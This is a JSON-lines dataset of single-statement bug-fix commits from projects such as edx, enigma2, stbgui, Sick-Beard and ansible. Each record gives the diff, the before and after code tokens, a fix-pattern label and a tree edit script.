{"project": "new_edx", "commit_sha": "1d6b1be888b22edddf06cb549677d9d492cb3688", "parent_sha": "baa0e9be018502ebe2b3bb36bf00c659e4af1dc2", "file_path": "common/djangoapps/student/models.py", "project_url": "https://github.com/syjeon/new_edx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -272,7 +272,7 @@ class TestCenterUserForm(ModelForm):\n         # create additional values here:\n         new_user.user_updated_at = datetime.utcnow()\n         new_user.save()\n-        log.info(\"Updated demographic information for user's test center exam registration: username \\\"{}\\\" \".format(new_user.username)) \n+        log.info(\"Updated demographic information for user's test center exam registration: username \\\"{}\\\" \".format(new_user.user.username)) \n         \n     # add validation:\n     \n", "before": "log . info ( \"Updated demographic information for user's test center exam registration: username \\\"{}\\\" \" . format ( new_user . username ) )", "after": "log . info ( \"Updated demographic information for user's test center exam registration: username \\\"{}\\\" \" . format ( new_user . user . username ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 118, 3, 135], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 118, 3, 135], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:new_user\", 3, 118, 3, 126], 0], [\"Move\", \"N0\", [\".:.\", 3, 126, 3, 127], 1], [\"Insert\", \"N0\", [\"identifier:user\", \"T\"], 2]]"}
{"project": "new_edx", "commit_sha": "09ab52bc946915d43cdf7dc29ae6947b91871307", "parent_sha": "bae2162fa065a242ce91bbb8828a13621f26331b", "file_path": "common/djangoapps/student/management/commands/pearson_import_conf_zip.py", "project_url": "https://github.com/syjeon/new_edx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class Command(BaseCommand):\n             else:\n                 try:\n                     registration = TestCenterRegistration.objects.get(client_authorization_id=client_authorization_id)\n-                    Command.datadog_error(\"Found authorization record for user {}\".format(registration.testcenter_user.user.username), eacfile)\n+                    Command.datadog_error(\"Found authorization record for user {}\".format(registration.testcenter_user.user.username), eacfile.name)\n                     # now update the record:\n                     registration.upload_status = row['Status']\n                     registration.upload_error_message =  row['Message']\n", "before": "Command . datadog_error ( \"Found authorization record for user {}\" . format ( registration . testcenter_user . user . username ) , eacfile )", "after": "Command . datadog_error ( \"Found authorization record for user {}\" . format ( registration . testcenter_user . user . username ) , eacfile . name )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 144], [\"attribute\", \"N0\"], 3], [\"Move\", \"N0\", [\"identifier:eacfile\", 3, 136, 3, 143], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "new_edx", "commit_sha": "51d882b7b0814e6fa129aee6b8a58e807a3cfd50", "parent_sha": "f7094803c14e4c6f314c469e9e40cb3f70959638", "file_path": "lms/djangoapps/instructor/views.py", "project_url": "https://github.com/syjeon/new_edx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1157,7 +1157,7 @@ def dump_grading_context(course):\n         msg += \"--> Section %s:\\n\" % (gs)\n         for sec in gsvals:\n             s = sec['section_descriptor']\n-            format = getattr(s, 'format', None)\n+            format = getattr(s.lms, 'format', None)\n             aname = ''\n             if format in graders:\n                 g = graders[format]\n", "before": "format = getattr ( s , 'format' , None )", "after": "format = getattr ( s . lms , 'format' , None )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 48], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:s\", 3, 30, 3, 31], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:lms\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "4bb90f0bab41813ebe1ae947db9ebf2d0a4965de", "parent_sha": "7846e68bd152b647ab36d2322ff1f143c545ba47", "file_path": "lib/python/Plugins/Extensions/Infopanel/plugin.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -804,7 +804,7 @@ class Info(Screen):\n \tdef ImageVersion(self):\n \t\ttry:\n \t\t\tself[\"label2\"].setText(_(\"Image Version\"))\n-\t\t\tnow = datetime.now()\n+\t\t\tnow = datetime.datetime.now()\n \t\t\tinfo1 = 'Date = ' + now.strftime(\"%d-%B-%Y\") + \"\\n\"\n \t\t\tinfo2 = 'Time = ' + now.strftime(\"%H:%M:%S\") + \"\\n\"\n \t\t\tinfo3 = self.Do_cmd(\"uptime\", None, None)\n", "before": "now = datetime . now ( )", "after": "now = datetime . datetime . now ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 10, 3, 22], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 10, 3, 22], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:datetime\", 3, 10, 3, 18], 0], [\"Move\", \"N0\", [\".:.\", 3, 18, 3, 19], 1], [\"Insert\", \"N0\", [\"identifier:datetime\", \"T\"], 2]]"}
{"project": "stbgui", "commit_sha": "cdaaee0da655f7d08c5cda38877ec798482c9706", "parent_sha": "741c61837972ba31ee12a68214cc271c5d8b5b70", "file_path": "skin.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class SkinError(Exception):\n \t\tself.msg = message\n \n \tdef __str__(self):\n-\t\treturn \"{%s}: %s\" % (config.skin.primary_skin, self.msg)\n+\t\treturn \"{%s}: %s\" % (config.skin.primary_skin.value, self.msg)\n \n dom_skins = [ ]\n \n", "before": "return \"{%s}: %s\" % ( config . skin . primary_skin , self . msg )", "after": "return \"{%s}: %s\" % ( config . skin . primary_skin . value , self . msg )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 24, 3, 48], [\"attribute\", 3, 24, 3, 48], 0], [\"Insert\", [\"attribute\", 3, 24, 3, 48], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 24, 3, 48], [\"identifier:value\", \"T\"], 2]]"}
{"project": "stbgui", "commit_sha": "0fa0646e9d874dc905a26551557902b2fc12d79e", "parent_sha": "d169bb4690ed7f65fe9de5327bf5f4908552a262", "file_path": "lib/python/Components/config.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1494,7 +1494,7 @@ class ConfigSubDict(dict, object):\n \t\tself.stored_values = dict(values)\n \t\tfor (key, val) in self.items():\n \t\t\tif str(key) in self.stored_values:\n-\t\t\t\tval = self.stored_values[str(key)]\n+\t\t\t\tval.saved_value = self.stored_values[str(key)]\n \n \tsaved_value = property(getSavedValue, setSavedValue)\n \n", "before": "val = self . stored_values [ str ( key ) ]", "after": "val . saved_value = self . stored_values [ str ( key ) ]", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 39], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:val\", 3, 5, 3, 8], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:saved_value\", \"T\"], 2]]"}
{"project": "stbgui", "commit_sha": "4e9abcf682b3aa8ff8ddf2fcb63e6d9f329f72fa", "parent_sha": "0b41d21e11a9aa7f70f6e148490cc26a03d7d4d7", "file_path": "lib/python/Screens/ChannelSelection.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -449,7 +449,7 @@ class ChannelSelectionEdit:\n \t\t\t\tif mutableAlternatives:\n \t\t\t\t\tmutableAlternatives.setListName(name)\n \t\t\t\t\tif mutableAlternatives.addService(cur_service.ref):\n-\t\t\t\t\t\tprint \"add\", cur_service.toString(), \"to new alternatives failed\"\n+\t\t\t\t\t\tprint \"add\", cur_service.ref.toString(), \"to new alternatives failed\"\n \t\t\t\t\tmutableAlternatives.flushChanges()\n \t\t\t\t\tself.servicelist.addService(new_ref.ref, True)\n \t\t\t\t\tself.servicelist.removeCurrent()\n", "before": "print \"add\" , cur_service . toString ( ) , \"to new alternatives failed\"", "after": "print \"add\" , cur_service . ref . toString ( ) , \"to new alternatives failed\"", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 20, 3, 40], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 20, 3, 40], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:cur_service\", 3, 20, 3, 31], 0], [\"Move\", \"N0\", [\".:.\", 3, 31, 3, 32], 1], [\"Insert\", \"N0\", [\"identifier:ref\", \"T\"], 2]]"}
{"project": "stbgui", "commit_sha": "645ffd0c4b909edeaa31e12316d4b7f85f528238", "parent_sha": "aa3cdfaba84c869bf748dc67afef981dd43ee8b7", "file_path": "lib/python/Screens/ChannelSelection.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -449,7 +449,7 @@ class ChannelSelectionEdit:\n \t\t\t\tif mutableAlternatives:\n \t\t\t\t\tmutableAlternatives.setListName(name)\n \t\t\t\t\tif mutableAlternatives.addService(cur_service.ref):\n-\t\t\t\t\t\tprint \"add\", cur_service.toString(), \"to new alternatives failed\"\n+\t\t\t\t\t\tprint \"add\", cur_service.ref.toString(), \"to new alternatives failed\"\n \t\t\t\t\tmutableAlternatives.flushChanges()\n \t\t\t\t\tself.servicelist.addService(new_ref.ref, True)\n \t\t\t\t\tself.servicelist.removeCurrent()\n", "before": "print \"add\" , cur_service . toString ( ) , \"to new alternatives failed\"", "after": "print \"add\" , cur_service . ref . toString ( ) , \"to new alternatives failed\"", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 20, 3, 40], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 20, 3, 40], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:cur_service\", 3, 20, 3, 31], 0], [\"Move\", \"N0\", [\".:.\", 3, 31, 3, 32], 1], [\"Insert\", \"N0\", [\"identifier:ref\", \"T\"], 2]]"}
{"project": "stbgui", "commit_sha": "26eb3912c8311fb612374cf16a8c8b255f254553", "parent_sha": "8030cdbdda4b7f08c7580e50e92532a76142ca76", "file_path": "lib/python/Screens/ChannelSelection.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -376,7 +376,7 @@ class ChannelContextMenu(Screen):\n \t\tself.close()\n \n \tdef showAlternativeServices(self):\n-\t\tself[\"Service\"].editmode = True\n+\t\tself.csel[\"Service\"].editmode = True\n \t\tself.csel.enterPath(self.csel.getCurrentSelection())\n \t\tself.close()\n \n", "before": "self [ \"Service\" ] . editmode = True", "after": "self . csel [ \"Service\" ] . editmode = True", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 3, 3, 3, 18], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:self\", 3, 3, 3, 7], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:csel\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "507999763dfb504d25dd4cc5569455aa29de87b8", "parent_sha": "6a063ea00a0782d3782ac210d2a403691c6bd7c2", "file_path": "lib/python/Screens/MovieSelection.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -810,7 +810,7 @@ class MovieSelection(Screen, HelpableScreen, SelectionEventInfo, InfoBarBase):\n \t\tself[\"waitingtext\"].hide()\n \n \tdef LivePlay(self):\n-\t\tif not self.playInBackground:\n+\t\tif not self.list.playInBackground:\n \t\t\tif self.session.nav.getCurrentlyPlayingServiceReference():\n \t\t\t\tif not self.session.nav.getCurrentlyPlayingServiceReference().toString().startswith('1:0:0:0:0:0:0:0:0:0'):\n \t\t\t\t\tconfig.movielist.curentlyplayingservice.setValue(self.session.nav.getCurrentlyPlayingServiceReference().toString())\n", "before": "if not self . playInBackground : if self . session . nav . getCurrentlyPlayingServiceReference ( ) : if not self . session . nav . getCurrentlyPlayingServiceReference ( ) . toString ( ) . startswith ( '1:0:0:0:0:0:0:0:0:0' ) : config . movielist . curentlyplayingservice . setValue ( self . session . nav . getCurrentlyPlayingServiceReference ( ) . toString ( ) )", "after": "if not self . list . playInBackground : if self . session . nav . getCurrentlyPlayingServiceReference ( ) : if not self . session . nav . getCurrentlyPlayingServiceReference ( ) . toString ( ) . startswith ( '1:0:0:0:0:0:0:0:0:0' ) : config . movielist . curentlyplayingservice . setValue ( self . session . nav . getCurrentlyPlayingServiceReference ( ) . toString ( ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 10, 3, 31], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 10, 3, 31], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 10, 3, 14], 0], [\"Move\", \"N0\", [\".:.\", 3, 14, 3, 15], 1], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "fa789f01c2e20b6c29691d28a1504ab6b45ff90f", "parent_sha": "71a45aa28d2194e78d826fc4e960022396302596", "file_path": "lib/python/Screens/MovieSelection.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -808,12 +808,12 @@ class MovieSelection(Screen, HelpableScreen, SelectionEventInfo, InfoBarBase):\n \t\t\tif config.movielist.show_live_tv_in_movielist.value:\n \t\t\t\tself.LivePlayTimer.start(100)\n \n- \tdef hidewaitingtext(self):\n+\tdef hidewaitingtext(self):\n \t\tself.hidewaitingTimer.stop()\n \t\tself[\"waitingtext\"].hide()\n \n \tdef LivePlay(self):\n-\t\tif not self.playInBackground:\n+\t\tif not self.list.playInBackground:\n \t\t\tif self.session.nav.getCurrentlyPlayingServiceReference():\n \t\t\t\tif not self.session.nav.getCurrentlyPlayingServiceReference().toString().startswith('1:0:0:0:0:0:0:0:0:0'):\n", "before": "if not self . playInBackground : if self . session . nav . getCurrentlyPlayingServiceReference ( ) : if not self . session . nav . getCurrentlyPlayingServiceReference ( ) . toString ( ) . startswith ( '1:0:0:0:0:0:0:0:0:0' ) : ", "after": "if not self . list . playInBackground : if self . session . nav . getCurrentlyPlayingServiceReference ( ) : if not self . session . nav . getCurrentlyPlayingServiceReference ( ) . toString ( ) . startswith ( '1:0:0:0:0:0:0:0:0:0' ) : ", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 8, 10, 8, 31], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 8, 10, 8, 31], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 8, 10, 8, 14], 0], [\"Move\", \"N0\", [\".:.\", 8, 14, 8, 15], 1], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 2]]"}
{"project": "Sick-Beard", "commit_sha": "963e425e97d55822abe99a20c831e338dedb0a85", "parent_sha": "2ab6c05c565483709da816e2ed92a2a80aa93e90", "file_path": "sickbeard/postProcessor.py", "project_url": "https://github.com/SickBay/Sick-Beard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -536,7 +536,7 @@ class PostProcessor(object):\n             return True\r\n         \r\n         # if the user downloaded it manually and it appears to be a PROPER/REPACK then it's priority\r\n-        if self.is_proper and new_ep_quality <= ep_obj.quality:\r\n+        if self.is_proper and new_ep_quality <= ep_obj.show.quality:\r\n             self._log(u\"This was manually downloaded but it appears to a proper so I'm marking it as priority\", logger.DEBUG)\r\n             return True \r\n         \r\n", "before": "if self . is_proper and new_ep_quality <= ep_obj . quality : self . _log ( u\"This was manually downloaded but it appears to a proper so I'm marking it as priority\" , logger . DEBUG ) return True", "after": "if self . is_proper and new_ep_quality <= ep_obj . show . quality : self . _log ( u\"This was manually downloaded but it appears to a proper so I'm marking it as priority\" , logger . DEBUG ) return True", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 49, 3, 63], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 49, 3, 63], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:ep_obj\", 3, 49, 3, 55], 0], [\"Move\", \"N0\", [\".:.\", 3, 55, 3, 56], 1], [\"Insert\", \"N0\", [\"identifier:show\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "c2326aef01f880edd87faf531333ddb95a598db3", "parent_sha": "74947168e378739f450017b5c38bdcbc6a02295b", "file_path": "lib/ansible/plugins/callback/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,7 +209,7 @@ class CallbackBase:\n \n     def _clean_results(self, result, task_name):\n         if task_name in ['debug']:\n-            for remove_key in ('changed', 'invocation'):\n+            for remove_key in ('changed', 'invocation', 'failed'):\n                 if remove_key in result:\n                     del result[remove_key]\n \n", "before": "for remove_key in ( 'changed' , 'invocation' ) : if remove_key in result : del result [ remove_key ]", "after": "for remove_key in ( 'changed' , 'invocation' , 'failed' ) : if remove_key in result : del result [ remove_key ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 31, 3, 56], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 31, 3, 56], [\"string:'failed'\", \"T\"], 5]]"}
{"project": "ansible-1", "commit_sha": "569377e95105063c96bee55f859ac4df286904b5", "parent_sha": "ba3a0e8e3426b6715fddac664fc86269853c367b", "file_path": "lib/ansible/executor/task_queue_manager.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -334,7 +334,7 @@ class TaskQueueManager:\n         defunct = False\n         for idx,x in enumerate(self._workers):\n             if hasattr(x[0], 'exitcode'):\n-                if x[0].exitcode in [-9, -15]:\n+                if x[0].exitcode in [-9, -11, -15]:\n                     defunct = True\n         return defunct\n \n", "before": "if x [ 0 ] . exitcode in [ - 9 , - 15 ] : defunct = True", "after": "if x [ 0 ] . exitcode in [ - 9 , - 11 , - 15 ] : defunct = True", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 37, 3, 46], [\"unary_operator\", \"N0\"], 3], [\"Insert\", [\"list\", 3, 37, 3, 46], [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N0\", [\"integer:11\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "5d0340a9e39b62ef4ecb9d049233f224036dfd33", "parent_sha": "6ba040591c8ce277537276c64a2654b80ff0c509", "file_path": "lib/ansible/modules/monitoring/datadog_monitor.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ def _update_monitor(module, monitor, options):\n \n         if 'errors' in msg:\n             module.fail_json(msg=str(msg['errors']))\n-        elif _equal_dicts(msg, monitor, ['creator', 'overall_state', 'modified']):\n+        elif _equal_dicts(msg, monitor, ['creator', 'overall_state', 'modified', 'matching_downtimes', 'overall_state_modified']):\n             module.exit_json(changed=False, msg=msg)\n         else:\n             module.exit_json(changed=True, msg=msg)\n", "before": "if 'errors' in msg : module . fail_json ( msg = str ( msg [ 'errors' ] ) ) elif _equal_dicts ( msg , monitor , [ 'creator' , 'overall_state' , 'modified' ] ) : module . exit_json ( changed = False , msg = msg ) else : module . exit_json ( changed = True , msg = msg )", "after": "if 'errors' in msg : module . fail_json ( msg = str ( msg [ 'errors' ] ) ) elif _equal_dicts ( msg , monitor , [ 'creator' , 'overall_state' , 'modified' , 'matching_downtimes' , 'overall_state_modified' ] ) : module . exit_json ( changed = False , msg = msg ) else : module . exit_json ( changed = True , msg = msg )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 41, 3, 81], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 41, 3, 81], [\"string:'matching_downtimes'\", \"T\"], 7], [\"Insert\", [\"list\", 3, 41, 3, 81], [\",:,\", \"T\"], 8], [\"Insert\", [\"list\", 3, 41, 3, 81], [\"string:'overall_state_modified'\", \"T\"], 9]]"}
{"project": "ansible-1", "commit_sha": "822c2c0cd3a46fc7bebb316d49387a95580b5ac5", "parent_sha": "0a26b149fc78ae5b4c920fc07032887d5366620a", "file_path": "lib/ansible/module_utils/cloudstack.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -119,7 +119,7 @@ class AnsibleCloudStack:\n         vms = self.cs.listVirtualMachines(**args)\n         if vms:\n             for v in vms['virtualmachine']:\n-                if vm in [ v['name'], v['id'] ]:\n+                if vm in [ v['displayname'], v['name'], v['id'] ]:\n                     self.vm_id = v['id']\n                     return self.vm_id\n         self.module.fail_json(msg=\"Virtual machine '%s' not found\" % vm)\n", "before": "if vm in [ v [ 'name' ] , v [ 'id' ] ] : self . vm_id = v [ 'id' ] return self . vm_id", "after": "if vm in [ v [ 'displayname' ] , v [ 'name' ] , v [ 'id' ] ] : self . vm_id = v [ 'id' ] return self . vm_id", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 26, 3, 48], [\"subscript\", \"N0\"], 1], [\"Insert\", [\"list\", 3, 26, 3, 48], [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:v\", \"T\"], 0], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'displayname'\", \"T\"], 2], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "8fd3935029e4aa7f55ae980797391e0d46621eb3", "parent_sha": "3ab9dddb3ad142c3587197f30f082371ec4ff9aa", "file_path": "lib/ansible/module_utils/basic.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ def get_distribution():\n     ''' return the distribution name '''\n     if platform.system() == 'Linux':\n         try:\n-            supported_dists = platform._supported_dists + ('arch',)\n+            supported_dists = platform._supported_dists + ('arch','alpine')\n             distribution = platform.linux_distribution(supported_dists=supported_dists)[0].capitalize()\n             if not distribution and os.path.isfile('/etc/system-release'):\n                 distribution = platform.linux_distribution(supported_dists=['system'])[0].capitalize()\n", "before": "supported_dists = platform . _supported_dists + ( 'arch' , )", "after": "supported_dists = platform . _supported_dists + ( 'arch' , 'alpine' )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 59, 3, 68], [\"string:'alpine'\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "a2547db5b57b967290734e7462fb05819ce08dfa", "parent_sha": "8b08a28c895666b9fc673e5bf26bd91b2be77fe6", "file_path": "lib/ansible/plugins/lookup/ini.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ from ansible.module_utils._text import to_bytes, to_text\n def _parse_params(term):\n     '''Safely split parameter term to preserve spaces'''\n \n-    keys = ['key', 'section', 'file', 're']\n+    keys = ['key', 'type', 'section', 'file', 're']\n     params = {}\n     for k in keys:\n         params[k] = ''\n", "before": "keys = [ 'key' , 'section' , 'file' , 're' ]", "after": "keys = [ 'key' , 'type' , 'section' , 'file' , 're' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'section'\", 3, 20, 3, 29], [\"list\", 3, 12, 3, 44], 4], [\"Move\", [\"string:'file'\", 3, 31, 3, 37], [\"list\", 3, 12, 3, 44], 7], [\"Insert\", [\"list\", 3, 12, 3, 44], [\"string:'type'\", \"T\"], 3], [\"Insert\", [\"list\", 3, 12, 3, 44], [\",:,\", \"T\"], 7]]"}
{"project": "ansible-1", "commit_sha": "5b4f3b1eda9ff5707fbbf8969bafb427f7755b09", "parent_sha": "9faf56a34524bfc5daf46957f21bf23cb258eb15", "file_path": "lib/ansible/module_utils/netcli.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -228,7 +228,7 @@ class Conditional(object):\n         if self.encoding in ['json', 'text']:\n             try:\n                 return self.get_json(result)\n-            except (IndexError, TypeError):\n+            except (IndexError, TypeError, AttributeError):\n                 msg = 'unable to apply conditional to result'\n                 raise FailedConditionalError(msg, self.raw)\n \n", "before": "try : return self . get_json ( result ) except ( IndexError , TypeError ) : msg = 'unable to apply conditional to result' raise FailedConditionalError ( msg , self . raw )", "after": "try : return self . get_json ( result ) except ( IndexError , TypeError , AttributeError ) : msg = 'unable to apply conditional to result' raise FailedConditionalError ( msg , self . raw )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 20, 3, 43], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 20, 3, 43], [\"identifier:AttributeError\", \"T\"], 5]]"}
{"project": "ansible-1", "commit_sha": "20fb74b1b1718f0145e89c31359c21f18490d131", "parent_sha": "5dd195b52f15dc25df364dfc70971f082ecceb6c", "file_path": "lib/ansible/plugins/lookup/ini.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ from ansible.module_utils._text import to_bytes, to_text\n def _parse_params(term):\n     '''Safely split parameter term to preserve spaces'''\n \n-    keys = ['key', 'type', 'section', 'file', 're']\n+    keys = ['key', 'type', 'section', 'file', 're', 'default']\n     params = {}\n     for k in keys:\n         params[k] = ''\n", "before": "keys = [ 'key' , 'type' , 'section' , 'file' , 're' ]", "after": "keys = [ 'key' , 'type' , 'section' , 'file' , 're' , 'default' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 12, 3, 52], [\",:,\", \"T\"], 10], [\"Insert\", [\"list\", 3, 12, 3, 52], [\"string:'default'\", \"T\"], 11]]"}
{"project": "ansible-1", "commit_sha": "f9b85306f0df8e1f049582af1de382555dee1510", "parent_sha": "f5a1196cc796b0ac2b4e75c2b12615e1e276a97b", "file_path": "lib/ansible/modules/extras/system/facter.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ def main():\n         argument_spec = dict()\n     )\n \n-    cmd = [\"/usr/bin/env\", \"facter\", \"--json\"]\n+    cmd = [\"/usr/bin/env\", \"facter\", \"--puppet\", \"--json\"]\n     rc, out, err = module.run_command(cmd, check_rc=True)\n     module.exit_json(**json.loads(out))\n \n", "before": "cmd = [ \"/usr/bin/env\" , \"facter\" , \"--json\" ]", "after": "cmd = [ \"/usr/bin/env\" , \"facter\" , \"--puppet\" , \"--json\" ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 11, 3, 47], [\"string:\\\"--puppet\\\"\", \"T\"], 5], [\"Insert\", [\"list\", 3, 11, 3, 47], [\",:,\", \"T\"], 6]]"}
{"project": "ansible-1", "commit_sha": "2f554518a6135db39c649df0f13ab19574075c77", "parent_sha": "927fb145b343660906cd719f1099758cf8381530", "file_path": "lib/ansible/modules/extras/packaging/language/bower.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -108,7 +108,7 @@ class Bower(object):\n         return ''\n \n     def list(self):\n-        cmd = ['list', '--json']\n+        cmd = ['list', '--json', '--config.interactive=false', '--allow-root']\n \n         installed = list()\n         missing = list()\n", "before": "cmd = [ 'list' , '--json' ]", "after": "cmd = [ 'list' , '--json' , '--config.interactive=false' , '--allow-root' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 15, 3, 33], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 15, 3, 33], [\"string:'--config.interactive=false'\", \"T\"], 5], [\"Insert\", [\"list\", 3, 15, 3, 33], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 15, 3, 33], [\"string:'--allow-root'\", \"T\"], 7]]"}
